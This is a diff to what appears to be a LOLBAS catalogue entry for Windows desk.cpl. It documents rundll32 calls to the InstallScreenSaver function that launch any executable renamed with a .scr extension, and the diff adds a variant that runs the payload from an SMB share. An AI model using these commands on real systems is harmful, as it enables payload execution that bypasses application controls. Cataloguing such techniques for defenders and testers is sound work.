@@ -1,26 +1,34 @@
 ---
 Name: desk.cpl
-Description: Display Propertieslibary
-Author: Hai vaknin
+Description: Desktop Settings Control Panel
+Author: Hai Vaknin
 Created: 2022-04-21
 Commands:
   - Command: "rundll32.exe desk.cpl,InstallScreenSaver C:\temp\file.scr"
-    Description: Launch an scr payload by calling InstallScreenSaver.
-    Usecase: Launch an screen saver file.
+    Description: Launch an executable with a .scr extension by calling the InstallScreenSaver function.
+    Usecase: Launch any executable payload, as long as it uses the .scr extension.
     Category: Execute
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows 10, Windows 11
+  - Command: "rundll32.exe desk.cpl,InstallScreenSaver \\127.0.0.1\c$\temp\file.scr"
+    Description: Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function.
+    Usecase: Launch any executable payload, as long as it uses the .scr extension.
+    Category: Execute
+    Privileges: User
+    MitreID: T1218.011
+    OperatingSystem: Windows 10, Windows 11    
 Full_Path:
   - Path: C:\Windows\System32\desk.cpl
   - Path: C:\Windows\SysWOW64\desk.cpl
 Detection:
   - IOC: 
 Resources:
+  - Link: https://twitter.com/pabraeken/status/998627081360695297
   - Link: https://twitter.com/VakninHai/status/1517027824984547329
-  - Link: https://file.io/x3CRqMdX95i0
-
 Acknowledgement:
+  - Person: Pierre-Alexandre Braeken
+    Handle: '@pabraeken'
   - Person: hai
     Handle: '@VakninHai'
 ---
